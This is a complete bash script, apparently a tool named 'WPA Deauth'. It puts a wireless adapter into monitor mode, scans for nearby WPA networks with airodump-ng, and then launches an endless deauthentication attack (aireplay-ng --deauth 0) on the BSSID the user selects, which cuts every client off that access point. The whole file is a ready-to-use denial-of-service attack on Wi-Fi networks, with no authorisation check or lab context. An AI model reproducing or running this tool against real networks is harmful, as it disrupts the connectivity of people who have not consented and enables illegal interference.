#!/bin/bash

parsing_dir=$(mktemp -d "${TMPDIR:-/tmp/}$(basename $0).XXXXXXXXXXXX")

RED="\e[0;31m"
WHITE="\e[0m"
BLUE="\e[1;36m"
YELLOW="\e[1;33m"

heading() {
clear
echo "__        ______   _      ____                   _   _"
echo "\ \      / /  _ \ / \    |  _ \  ___  __ _ _   _| |_| |__"
#echo " \ \ /\ / /| |_) / _ \   | | | |/ _ \/ _` | | | | __| '_ \`"
echo "  \ V  V / |  __/ ___ \  | |_| |  __/ (_| | |_| | |_| | | |"
echo "   \_/\_/  |_| /_/   \_\ |____/ \___|\__,_|\__,_|\__|_| |_|"
echo "                                                           "
}

select_adapter() {
echo -e "${BLUE}-------------- ${YELLOW}Choose a Network Interface to Use${BLUE} --------------${WHITE}\n"
echo -e "${RED}WARNING: ${WHITE}Try and avoid using wlan0\n"
iwconfig > $parsing_dir/iwconfig.txt 2> /dev/null
cat $parsing_dir/iwconfig.txt | grep "IEEE" | cut -d' ' -f1 > $parsing_dir/network-adapters.txt
mapfile -t listed_interface < $parsing_dir/network-adapters.txt
for adapter_num in {0..50}; do
if [ ! -z ${listed_interface[adapter_num]} ]; then
echo "$adapter_num) ${listed_interface[adapter_num]}"; fi
done
echo ""
read -n 1 -p "Select Network Interface: " interface_num
interface="${listed_interface[interface_num]}"
if [ -z $interface ]; then
echo -e "\n\n${RED}Invalid Option!${WHITE}"
sleep 2
heading
select_adapter
fi
}

scan_for_targets() {
echo -e "\n\n${BLUE}Press CTRL + C to stop scan${WHITE}"
iwconfig $interface > $parsing_dir/mon-check-listed.txt 2>/dev/null
interface_mode=$(cat $parsing_dir/mon-check-listed.txt | grep "Mode:" | awk -F "Mode:" {'print $2'} | cut -d' ' -f1)
if [ $interface_mode != "Monitor" ]; then
ifconfig $interface down
iwconfig $interface mode monitor
ifconfig $interface up
fi
sleep 1
airodump-ng -w $parsing_dir/scan-results --output-format csv $interface
}

show_scan_results() {
heading
echo -e "${BLUE}------------------- ${YELLOW}Choose a target Network${BLUE} -------------------${WHITE}\n"
cat $parsing_dir/scan-results-01.csv | grep "WPA" | cut -d',' -f14 > $parsing_dir/networks.txt
mapfile -t listed_network < $parsing_dir/networks.txt
for network_num in {0..100}; do
if [ ! -z ${listed_network[network_num]} ]; then
echo "${network_num}) ${listed_network[network_num]}"; fi
done
echo ""
read -p "Select Network: " chosen_network
if [ -z ${listed_network[chosen_network]} ]; then
echo "${RED}Invalid Option!${WHITE}"
sleep 2
show_scan_results
fi
network=$(echo "${listed_network[chosen_network]}" | tr -d ' ')
bssid=$(cat $parsing_dir/scan-results-01.csv | grep "$network" | cut -d',' -f1 | xargs)
}

start_deauth() {
heading
aireplay-ng --deauth 0 -a $bssid $interface
}


heading
select_adapter
scan_for_targets
show_scan_results
start_deauth
